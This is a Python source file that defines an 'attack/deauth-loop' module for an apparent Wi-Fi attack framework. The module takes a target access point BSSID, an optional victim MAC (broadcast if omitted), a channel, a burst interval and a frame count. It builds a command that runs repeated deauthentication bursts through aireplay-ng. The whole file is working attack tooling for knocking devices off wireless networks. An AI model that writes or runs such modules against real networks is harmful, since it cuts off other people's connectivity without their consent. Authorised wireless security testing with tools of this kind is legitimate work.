"""attack/deauth-loop — continuous deauth bursts every N seconds."""

from __future__ import annotations

from wifipi.module import Module
from wifipi.options import OptionSpec


class DeauthLoop(Module):
    NAME = "attack/deauth-loop"
    CATEGORY = "attack"
    DESCRIPTION = "Continuous deauth burst every N seconds. Kill with `kill <id>`."
    OPTIONS = {
        "BSSID":    OptionSpec(required=True,  description="Target AP BSSID.", kind="bssid"),
        "CLIENT":   OptionSpec(required=False, default=None,
                               description="Victim MAC (omit for broadcast).", kind="mac"),
        "CHANNEL":  OptionSpec(required=True,  description="AP channel.", kind="int"),
        "INTERVAL": OptionSpec(required=False, default="5",
                               description="Seconds between bursts.", kind="int"),
        "BURST":    OptionSpec(required=False, default="5",
                               description="Frames per burst.", kind="int"),
    }
    REQUIRES_TOOLS = ["aireplay-ng"]
    BLOCKING = False
    REQUIRES_CONFIRMATION = True
    LOOT_SUBDIR = "attacks"

    def build_argv(self, opts: dict) -> list[str]:
        iface = opts["MON_IFACE"]
        argv = [
            "python3", "-m", "wifipi.modules.attack._deauth_loop_runner",
            "--bssid", opts["BSSID"],
            "--iface", iface,
            "--interval", str(opts["INTERVAL"]),
            "--burst", str(opts["BURST"]),
        ]
        client = opts.get("CLIENT")
        if client:
            argv += ["--client", client]
        return argv
